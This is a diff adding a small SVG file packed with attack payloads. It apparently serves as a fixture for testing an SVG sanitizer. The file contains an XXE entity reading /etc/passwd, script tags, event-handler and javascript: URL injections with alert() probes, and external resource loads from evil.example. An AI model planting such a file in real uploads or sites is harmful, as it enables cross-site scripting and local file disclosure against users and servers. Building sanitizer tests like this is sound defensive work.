@@ -1,0 +1,8 @@
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" viewBox="0 0 10 10"><script>alert(2)</script>
+<foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(3)"><iframe src="javascript:alert(4)"></iframe></body></foreignObject>
+<a xlink:href="javascript:alert(5)"><rect width="5" height="5" onclick="alert(6)" fill="url(http://evil.example/x)"/></a>
+<rect width="3" height="3" fill="red" style="background:url(javascript:alert(7))" onmouseover="alert(8)"/>
+<use href="http://evil.example/s.svg#a"/><image href="http://evil.example/i.png"/><set attributeName="onload" to="alert(9)"/>
+<animate attributeName="href" values="javascript:alert(10)"/><style>@import url(http://evil.example/c.css);</style>
+<circle cx="5" cy="5" r="2" fill="#112233"/><![CDATA[<script>alert(11)</script>]]><!-- <script>alert(12)</script> --></svg>
